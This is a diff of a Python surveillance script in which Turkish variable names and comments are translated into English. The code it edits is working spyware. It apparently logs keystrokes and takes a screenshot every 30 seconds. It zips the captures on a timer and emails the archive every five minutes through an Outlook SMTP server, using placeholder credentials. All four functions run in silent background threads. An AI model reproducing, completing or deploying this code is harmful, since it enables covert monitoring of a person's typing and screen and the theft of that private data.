@@ -12,14 +12,14 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 
 if os.path.exists("C:\\Picture\\"):
-    zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w")
+    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
     pass
 else:
     os.mkdir('C:\\Picture')
     os.mkdir('C:\\Picture\\Default')
-    zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w")
+    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
     pass
- 
+
 keys = []
 count = 0
 def keyboard():
@@ -53,66 +53,57 @@ def keyboard():
         
 def ss():
         threading.Timer(30.0, ss).start()
-        # Pyautogui ile ekran görüntüsünü alıyoruz.
-        ekran_goruntusu = pyautogui.screenshot()
-        dosya_adi = str(time.time_ns()) + ".jpg"
-        dosya_yolu = os.path.join('C:\\Picture\\Default', dosya_adi)
-        ekran_goruntusu.save(dosya_yolu)
+        # Taking a screenshot using Pyautogui.
+        screenshot = pyautogui.screenshot()
+        file_name = str(time.time_ns()) + ".jpg"
+        file_path = os.path.join('C:\\Picture\\Default', file_name)
+        screenshot.save(file_path)
 
-def rar():
-    arsivlenecekDosyalar=[]
-    threading.Timer(280.0, rar).start()
-    for belge in glob.iglob("C:\\Picture\\Default\\**/*", recursive=True):
-        arsivlenecekDosyalar.append(belge)
-    with zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w") as arsiv:
-        for dosya in arsivlenecekDosyalar:
-            arsiv.write(dosya)
+def compress():
+    files_to_compress = []
+    threading.Timer(280.0, compress).start()
+    for document in glob.iglob("C:\\Picture\\Default\\**/*", recursive=True):
+        files_to_compress.append(document)
+    with zipfile.ZipFile("C:\\Picture\\archive.zip", "w") as archive:
+        for file in files_to_compress:
+            archive.write(file)
         
-def mail():
-    threading.Timer(300.0, mail).start()
-    yoladres = "sendmail"
-    aliciadres = "receivermail"
+def send_mail():
+    threading.Timer(300.0, send_mail).start()
+    sender_address = "sendmail"
+    recipient_address = "receivermail"
 
     msg = MIMEMultipart()
-    msg['from'] = yoladres
-    msg['to'] = aliciadres
-    msg['Konu'] = "Bazı Önemli formlar"
+    msg['from'] = sender_address
+    msg['to'] = recipient_address
+    msg['Subject'] = "Some Important Documents"
 
-    konu = "Aşagida ekte bulabilirsin: "
-    msg.attach(MIMEText(konu, 'plain'))
-    dosyaismi = "arsiv.zip"
-    attachment = open("C:\\Picture\\arsiv.zip", "rb")
+    subject = "You can find the attached files below: "
+    msg.attach(MIMEText(subject, 'plain'))
+    file_name = "archive.zip"
+    attachment = open("C:\\Picture\\archive.zip", "rb")
 
     part = MIMEBase('application', 'octet-stream')
     part.set_payload((attachment).read())
     encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= %s" % dosyaismi)
+    part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
 
     msg.attach(part)
 
     server = smtplib.SMTP('smtp.outlook.com', 587)
     server.starttls()
-    server.login(yoladres,"sendmail-password")
+    server.login(sender_address, "sendmail-password")
     text = msg.as_string()
-    server.sendmail(yoladres, aliciadres, text)
+    server.sendmail(sender_address, recipient_address, text)
     server.quit()
 
 if __name__ == '__main__':
     t1 = threading.Thread(target=keyboard)
     t2 = threading.Thread(target=ss)
-    t3 = threading.Thread(target=rar)
-    t4 = threading.Thread(target=mail)
+    t3 = threading.Thread(target=compress)
+    t4 = threading.Thread(target=send_mail)
     t1.start()
     t2.start()
     t3.start()
     t4.start()
-
-#onurkya7
-
-
-
-
-
-
-
 
